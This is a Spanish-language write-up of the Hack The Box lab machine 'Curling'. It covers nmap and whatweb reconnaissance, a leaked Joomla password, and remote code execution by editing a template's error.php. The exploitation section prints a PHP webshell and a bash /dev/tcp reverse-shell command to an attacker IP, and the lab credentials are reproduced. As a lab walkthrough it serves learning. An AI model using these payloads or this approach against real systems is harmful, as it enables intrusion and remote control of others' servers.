# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]
```
ping -c 1 10.10.10.150
nmap -p- --open -vvv -sS --min-rate 5000 -n -Pn 10.10.10.150 -oG allports
extract Ports allports
nmap -sCV -p22,80 10.10.10.150 -oN target
whatweb http://10.10.10.150
nmap --script http-enum -p22,80 10.10.10.150 -oN webScan
```
![[Curling1.png]]![[Curling2.png]]
*Resultado:*
Es una maquina linux por el ttl
Puertos 22 ssh y 80 apache abiertos

--------------
# [[Enumeracion con pequeño script de NMAP y Whatweb-wappalyzer]]

![[Curling3.png]]
El whatweb no nos da ninguna información relevante, y tenemos para probar muchos directorios.
Este nos da un panel de acceso
	http://10.10.10.150/administrator/
	
Viendo el codigo fuente de la pagina principal http://10.10.10.150 al final de todo nos pone secret.txt
![[Curling4.png]]
Entramos a http://10.10.10.150/secret.txt
![[Curling5.png]]
Es una linea en base64
![[Curling6.png]]
Esta va a ser la contraseña, y el usuario lo saque de esta publicacion
![[Curling7.png]]

Usuario: Floris
Contraseña: Curling2018!

-------------
# RCE(Remote Comand Ejecution) En joomla
### Enumeracion
[Articulo que explica como sacar una revershell con joomla](https://www.hackingarticles.in/joomla-reverse-shell/)
Vamos a ir a la parte de templates, 
![[Curling8.png]]

Vamos a seleccionar la parte de templates que esta a la izquierda, y despues vamos a elegir cualquiera en mi caso uso el de beez3
![[Curling9.png]]
Ahora vamos a modificar en mi caso el archivo error.php y le vamos a inyectar este comando. Y guardamos los cambios
```
<?php system("whoami");?>
```
![[Curling10.png]]
Ahora cuando entremos al link
http://10.10.10.150/templates/beez3/error.php nos tendria que aparecer la respuesta del comando whoami
![[Curling11.png]]

### Explotacion

Como nos responde que usuarios somos, ya sabemos que hay un RCE, y vamos a intentar mandarnos una Revershell

 ```php
 <?php system("bash -c 'bash -i >& /dev/tcp/10.10.16.4/443 0>&1'");?>
```
Mientras nos ponemos en escucha con [[nc -nlvp 443]]
![[Curling12.png]]
Y listo ya ganamos acceso a la maquina
![[Curling13.png]]

-----------
# [[Apuntes Directo/Herramientas-Comandos/Tratamiento de la TTY|Tratamiento de la TTY]]

----------
# Escalada de privilegios

Encontramos esto
![[Curling15.png]]






![[Curling14.png]]


# Notas

`uname -m`
Es para ver si el OS es de 32 o 64, si devuelve x86_64 es de 64
# Creditos
[Writeup de lanzt](https://lanzt.github.io/htb/curling)
Writeup oficial de HTB

